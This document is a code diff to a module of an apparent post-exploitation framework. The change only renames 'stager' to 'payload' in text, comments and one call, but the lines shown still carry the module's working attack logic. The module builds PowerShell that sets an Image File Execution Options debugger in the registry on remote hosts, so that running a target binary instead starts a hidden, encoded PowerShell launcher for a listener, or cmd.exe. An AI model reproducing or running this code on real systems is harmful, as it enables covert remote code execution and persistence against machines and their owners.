@@ -10,7 +10,7 @@ class Module:
             'Author': ['@harmj0y'],
 
             'Description': ('Uses WMI to set the debugger for a target binary on a remote '
-                            'machine to be cmd.exe or a stager.'),
+                            'machine to be cmd.exe or a payload.'),
 
             'Background' : False,
 
@@ -42,7 +42,7 @@ class Module:
                 'Value'         :   ''                
             },
             'ComputerName' : {
-                'Description'   :   'Host[s] to execute the stager on, comma separated.',
+                'Description'   :   'Host[s] to execute the payload on, comma separated.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
@@ -136,7 +136,7 @@ class Module:
             statusMsg += " to remove the debugger for " + targetBinary
 
         elif listenerName != '':
-            # if there's a listener specified, generate a stager and store it
+            # if there's a listener specified, generate a payload and store it
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
                 print helpers.color("[!] Invalid listener: " + listenerName)
@@ -144,7 +144,7 @@ class Module:
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True)
+                launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True)
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -165,7 +165,7 @@ class Module:
 
             payloadCode += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';"
 
-            statusMsg += " to set the debugger for "+targetBinary+" to be a stager for listener " + listenerName + "."
+            statusMsg += " to set the debugger for "+targetBinary+" to be a payload for listener " + listenerName + "."
 
         else:
             payloadCode = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+binary+"';"
